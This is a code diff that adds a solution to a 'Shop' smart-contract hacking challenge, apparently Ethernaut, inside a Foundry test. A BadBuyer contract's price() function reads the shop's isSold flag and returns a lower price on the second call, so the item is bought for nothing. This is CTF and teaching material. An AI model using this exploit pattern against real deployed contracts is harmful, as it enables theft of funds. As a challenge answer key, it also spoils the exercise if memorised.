@@ -38,8 +38,36 @@ contract TestShop is BaseTest {
         /**
          * CODE YOUR EXPLOIT HERE
          */
+
+        // The function price() is view, but it does not mean in can not change its behavior
+        // It can not modify the state, but it can read it.
+        // We can read Shop's isSold varible and decide what to return.
+        // Shop calls price() twice and changes its isSold to true betwenn those calls.
+
         vm.startPrank(player, player);
 
+        // Deploy BadBuyer contract
+        BadBuyer badBuyer = new BadBuyer(level);
+
+        // Call buy() function from BadBuyer contract
+        badBuyer.buy();
+
         vm.stopPrank();
+    }
+}
+
+contract BadBuyer {
+    Shop public shop;
+
+    constructor(Shop _shop) public {
+        shop = _shop;
+    }
+
+    function price() external view returns (uint256) {
+        return shop.isSold() ? 0 : 100;
+    }
+
+    function buy() public {
+        shop.buy();
     }
 }
